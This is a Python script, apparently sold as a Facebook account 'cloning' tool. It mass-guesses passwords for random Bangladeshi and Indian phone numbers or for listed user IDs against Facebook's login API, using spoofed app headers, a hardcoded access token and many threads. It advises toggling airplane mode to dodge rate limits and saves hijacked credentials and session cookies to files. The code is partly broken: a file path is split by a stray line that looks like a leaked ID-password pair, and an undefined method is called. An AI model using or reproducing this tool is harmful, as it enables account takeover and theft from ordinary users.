#__________________[ IMPORT ]__________________#
import os,zlib
from os import system as osRUB
from os import system as cmd
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] LOADING MODULES ')
try:
    import requests 
except ImportError:
    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING REQUESTS ')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING FUTURES ')
    os.system('pip install futures')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as Habib
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#__________________[ LOOP ]__________________#
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2; swag\x07')
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
#__________________[ COLOUR ]__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________[ LINEX ]__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}──────────────────────────────────────────────────')
#__________________[ LOGO ]__________________#
logo =f"""{A}
    ___________________  __________ .___    _____    
\_   _____/\_____  \ \______   \|   |  /  _  \   
 |    __)   /   |   \ |    |  _/|   | /  /_\  \  
 |     \   /    |    \|    |   \|   |/    |    \ 
 \___  /   \_______  /|______  /|___|\____|__  / 
     \/            \/        \/              \/  
                                                 ──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} X. A. Moha
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} X. A. Moha\_____:*\❷/3:)\⓿
{G1}[{A}={G3}]{G3} TOOLTYPE {A}:{G3} FILE {A}&{G4} RANDOM CLONING
{G1}[{A}={G4}]{G4} STATUS   {A}:{G4} SCRIPT SELL
{A}──────────────────────────────────────────────────"""
#__________________[ RESULT ]__________________#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\r{A}──────────────────────────────────────────────────')
        print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETE...')
        print(f'{G1}[{A}={G2}]{G2} TOTAL OK {A}:{G2} %s' % str(len(oks)))
        print(f'{G1}[{A}={G2}]{G3} TOTAL CP {A}:{G3} %s' % str(len(cps)))
        print(f'\r{A}──────────────────────────────────────────────────')
        input(f"{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK MENU ")
        exit()
#__________________[ MENU ]__________________#
def menu():   
    clear()
    print(f'{G1}[{A}1{G1}]{G1} FILE CLONING')
    print(f'{G1}[{A}2{G2}]{G2} RANDOM CLONING')
    print(f'{G1}[{A}3{G3}]{G3} CONTACT TOOL OWNER')
    print(f'{G1}[{A}0{G4}]{G4} EXIT TOOLS')
    linex()
    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
    if select =='1':
        _file_()
    elif select =='2':
        _randm_()
    elif select =='3':
        os.system('xdg-open https://www.facebook.com/sk.sahathat');menu()
    elif select =='0':
        exit(f'{G1}[{A}={G1}]{G1} EXIT DONE ')
    else:
        print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
        time.sleep(2)
        menu()
#__________________[ RANDOM ]__________________#      
def _randm_():   
    clear()
    print(f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONING')
    print(f'{G1}[{A}2{G2}]{G2} INDIA CLONING')
    print(f'{G1}[{A}0{G3}]{G3} BACK TO MAIN MENU')
    linex()
    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
    if select =='1':
        _bd_()
    elif select =='2':
        _India_()
    elif select =='0':
    	menu()
    else:
        print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
        time.sleep(2)
        _randm_()
#__________________[ BANGLADESH ]__________________#
def _bd_():
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} 017{A}/{G1}019{A}/{G1}018{A}/{G1}016');linex()
    code = input(f'{G1}[{A}?{G2}]{G2} CHOICE  {A}:{G2} ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
    limit = int(input(f'{G1}[{A}?{G4}]{G4} CHOICE  {A}:{G4} '))
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    clear()
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
        print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN');linex()
        for love in user:
            ids = code+name+cod+love
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}──────────────────────────────────────────────────')
    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}={G2}]{G2} TOTAL OK ID {A}:{G2} {str(len(ok))}')
    print(f'{G1}[{A}={G3}]{G3} TOTAL CP ID {A}:{G3} {str(len(cp))}')
    print(f'\r{A}──────────────────────────────────────────────────')
    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
    menu()
#__________________[ INDIA ]__________________#
def _India_():
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} +91639{A}/{G1}+91934{A}/{G1}+91902{A}/{G1}+91701');linex()
    code = input(f'{G1}[{A}?{G2}]{G2} CHOICE  {A}:{G2} ')
    clear()
    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
    limit = int(input(f'{G1}[{A}?{G4}]{G4} CHOICE  {A}:{G4} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
        print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN');linex()
        for love in user:
            ids = code+love
            psd = [love,ids[:8],'57273200','59039200','57575751']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}──────────────────────────────────────────────────')
    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}={G2}]{G2} TOTAL OK ID {A}:{G2} {str(len(ok))}')
    print(f'{G1}[{A}={G3}]{G3} TOTAL CP ID {A}:{G3} {str(len(cp))}')
    print(f'\r{A}──────────────────────────────────────────────────')
    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
    menu()
#__________________[ FILE ]__________________#      
def _file_():
    global methods
    clear()
    print(f'{G1}[{A}1{G1}]{G1} METHOD {G1}[{A}M1{G1}]{G1} ')
    print(f'{G1}[{A}2{G2}]{G2} METHOD {G2}[{A}M2{G2}]{G1} ')
    linex()
    option = input(f'{G1}[{A}?{G3}]{G3} CHOICE {A}:{G3} ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='0':
        _file_()
    else:
      print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
      time.sleep(2)
      _file_()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/FOBIA.txt');linex()
        self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'{G1}[{A}={G2}]{G2} OPPS FILE NOT FOUND ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f'{G1}[{A}={G2}]{G2} TRY AGAIN ...')
            time.sleep(2)
            main_crack().crack(id)
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";''[FBAN/FB4A;FBAV/79.0.0.18.71;FBBV/31009842;FBDM/{density=1.3312501,width=800,height=1216};FBLC/en_US;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TAB 2 A8-50LC;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/79.0.0.0.52;FBBV/30370547;FBDM/{density=1.5,width=480,height=854};FBLC/es_ES;FBCR/TIGO;FBMF/verykool;FBBD/verykool;FBPN/com.facebook.katana;FBDV/verykoolS5004;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/71.0.0.0.31;FBBV/26039933;FBDM/{density=2.0,width=720,height=1280};FBLC/ar_AR;FBCR/TUNISIE TELECOM;FBMF/Cellcom;FBBD/EVERTEK;FBPN/com.facebook.katana;FBDV/EverMiracle S;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Vip MK;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/4013X;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/72.0.0.22.69;FBBV/27550279;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_BR;FBCR/Vivo;FBMF/Android;FBBD/Android;FBPN/com.facebook.katana;FBDV/J7 Prime;FBSV/6.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/85.0.0.15.70;FBBV/33678624;FBDM/{density=1.5,width=480,height=854};FBLC/it_IT;FBCR/;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/LENNY2;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/76.0.0.24.67;FBBV/29581438;FBDM/{density=1.5,width=540,height=960};FBLC/pt_BR;FBCR/CLARO BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/88.0.0.22.76;FBBV/35266889;FBDM/{density=1.5,width=480,height=800};FBLC/fr_FR;FBCR/TUNTEL;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI Y336-U02;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]" 
            sys.stdout.write(f"\r{G1}[{A}FOBIA-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
                    print(f"\r\r{G1}[FOBIA-OK] {sid} | {ps} ")
                    open('/sdcard/FOBIA-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[FOBIA-CP] {sid} | {ps} ")
                     open('/sdcard/FOBIA
                           -M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}FOBIA-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'authority': 'free.facebook.com',
                                  'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'fr-DZ,fr;q=0.9,ar-DZ;q=0.8,ar;q=0.7,fr-FR;q=0.6,en-US;q=0.5,en;q=0.4',
                    'cache-control': 'max-age=0',
                    'dpr': '3',
                    'pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace',
                    'referer': 'https://free.facebook.com/?stype=lo&deoia=1&jlou=Afc8IQI6kcGbD-VLO_PmkG3OioWbnHh-Ich4C61_3hbSQNteHfjyIvxcj1Db10SWNtYnxkGpKclXV6XdIpkYe5RKOlk0vsYeRUo0rk_-09TaEw&smuh=8420&lh=Ac-rE6p8rQiPMoDAbtM&refid=8&ref_component=mbasic_footer&_rdr',
                    'sec-ch-prefers-color-scheme': 'light',
                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Linux"',
                    'sec-ch-ua-platform-version': '""',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'viewport-width': '980',}
                q = session.post("https://free.facebook.com/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
                    print(f"\r\r{G1}[FOBIA-OK] {sid} | {ps} ")
                    open('/sdcard/FOBIA-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[FOBIA-CP] {sid} | {ps} ")
                    open('/sdcard/FOBIA100045723471156 | wahab2006
 [Maya-CP]-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            pw = []
            clear()
            print(f'{G1}[{A}={G2}]{G2} EXAMPLE {A}:{G2} BD 10-18/INDIA 3-5');linex()
            sl = int(input(f'{G1}[{A}?{G3}]{G3} PASSWORD LIMIT {A}:{G3} '))
            clear()
            print(f'{G1}[{A}?{G4}]{G4} EXAMPLE {A}:{G4} first123/firstlast/first@@@')
            linex()
            if sl =='':
                print(f'{G1}[{A}={G5}]{G5} PUT LIMIT BETWEEN 1 TO 30')
            elif sl > 20:
                print(f'{G1}[{A}={G1}]{G1} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'{G1}[{A}={G1}]{G1} PASSWORD NO {G1}[{A}{sr+1}{G1}] {A}:{G1} '))
            clear()
            print(f'{G1}[{A}={G1}]{G1} TOTAL FILE UID {A}:{G1} %s ' % len(self.id))
            print(f'{G1}[{A}={G2}]{G2} PASSWORD LIMIT {A}:{G1} {sl} ')
            print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN')
            linex()
            with Habib(max_workers=30) as swagworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                swagworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                swagworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
#__________________[ RANDOM METHOD ]__________________#
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}SAWG-XD{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': '[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f'\r\r{G1}[FOBIA-OK] {uid} | {pas}')
                #print(f'\r\r{G1}[COOKIE]{A} {coki}')
                open('/sdcard/TMT-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
          
menu() 
#__________________[ END ]__________________#